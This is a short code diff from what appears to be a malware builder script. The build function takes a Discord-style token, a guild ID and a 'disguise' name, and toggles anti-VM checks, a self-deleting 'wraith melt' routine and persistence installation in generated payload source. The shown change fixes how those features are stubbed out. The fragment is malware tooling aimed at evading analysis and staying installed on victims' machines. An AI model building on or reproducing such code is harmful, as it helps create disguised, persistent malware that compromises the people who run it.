@@ -186,8 +186,8 @@ def build(token, guild_id, preset_name, disguise_name):
         if not preset["anti_vm"]:
             main_content = main_content.replace('if AntiAnalysis.check_all():', 'if False:')
         if not preset["stealth"]:
-            main_content = main_content.replace('self.wraith.melt()', '# Wraith Disabled')
-            main_content = main_content.replace('Persistence.install()', '# Persistence Disabled')
+            main_content = main_content.replace('self.wraith.melt()', 'pass # Wraith Disabled')
+            main_content = main_content.replace('Persistence.install()', 'pass # Persistence Disabled')
 
         with open(main_path, "w") as f:
             f.write(main_content)
